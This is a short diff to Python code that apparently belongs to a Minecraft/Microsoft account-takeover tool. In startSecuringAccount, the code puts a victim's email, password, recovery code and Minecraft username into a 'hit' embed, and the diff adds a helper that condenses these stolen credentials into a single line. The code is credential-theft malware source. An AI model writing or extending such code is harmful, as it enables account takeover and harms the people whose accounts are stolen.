@@ -1,5 +1,5 @@
 from securing.utils.cookies.get_livedata import livedata
-from securing.build_embeds import build_account_embeds
+from securing.build_embeds import add_credential_line_field, build_account_embeds
 from securing.auth.polish_host import polish_host
 from securing.auth.get_msaauth import get_msaauth
 from securing.utils.secure import secure
@@ -123,6 +123,14 @@ async def startSecuringAccount(session: httpx.AsyncClient, email, device = None,
         hit_embed.add_field(name="Password", value=f"```{ms.get('password', 'Unknown')}```", inline=True)
         hit_embed.add_field(name="Recovery Code", value=f"```{ms.get('recovery_code', 'Unknown')}```", inline=False)
         hit_embed.add_field(name="MC Username", value=f"```{account['minecraft'].get('name', 'Unknown')}```", inline=False)
+        add_credential_line_field(
+            hit_embed,
+            email=ms.get("email", ""),
+            recovery=ms.get("recovery_code", ""),
+            password=ms.get("password", ""),
+            security_email=ms.get("security_email", ""),
+            username=account["minecraft"].get("name", ""),
+        )
         return {
             "hit_embed": hit_embed,
             "account_id": account_id,
